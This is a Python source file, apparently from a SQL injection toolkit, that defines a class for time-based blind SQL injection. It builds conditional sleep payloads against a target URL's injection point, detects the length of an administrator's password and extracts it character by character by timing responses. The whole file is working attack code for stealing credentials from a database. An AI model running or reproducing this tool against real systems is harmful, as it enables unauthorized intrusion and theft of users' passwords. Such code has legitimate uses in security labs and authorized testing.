from .main import BaseSQLi
from .dbConfig import DB_CONFIG
import string
import time

class BlindTimeBased(BaseSQLi):
    def __init__(self, url, inject_point, targetTable, db_type="oracle", extra_cookies=None, delay=5):
        super().__init__(url, targetTable, db_type, inject_point, extra_cookies)
        self.found_password = ""
        self.delay = delay
        self.signal = DB_CONFIG[self.db_type]['sleep'].format(delay=self.delay)
    def build_condition_payload(self, condition):
        return f"'||(SELECT CASE WHEN ({condition}) THEN {self.signal} ELSE 0 END{DB_CONFIG[self.db_type]['from_dual']})||'"

    def check_signal(self, response):
        return self._last_elapsed >= self.delay

    def detect_length(self, column, username='administrator'):
        print("[*] Detecting password length...")
        for length in range(1, 51):
            condition = f"LENGTH((SELECT {column} FROM {self.targetTable} WHERE username='{username}'))={length}"
            payload = self.build_condition_payload(condition)
            start_time = time.time()
            response = self.send(payload)
            self._last_elapsed = time.time() - start_time
            if self.check_signal(response):
                print(f"[+] Password length: {length}")
                return length
        print("[-] Could not detect password length.")
        return None

    def extract_char_binary(self, column, position, username='administrator'):
        substr = DB_CONFIG[self.db_type]['substr']
        low = 32
        high = 126
        while low < high:
            mid = (low + high) // 2
            condition = f"ASCII({substr}((SELECT {column} FROM {self.targetTable} WHERE username='{username}'),{position},1))>{mid}"
            payload = self.build_condition_payload(condition)
            start_time = time.time()
            response = self.send(payload)
            self._last_elapsed = time.time() - start_time
            if self.check_signal(response):
                low = mid + 1
            else:
                high = mid
        return chr(low)

    def extract(self, column, username='administrator'):
        length = self.detect_length(column, username)
        if not length:
            return None
        for position in range(1, length + 1):
            char = self.extract_char_binary(column, position, username)
            self.found_password += char
            print(f"[+] Position {position}: {char}  →  {self.found_password}")
        return self.found_password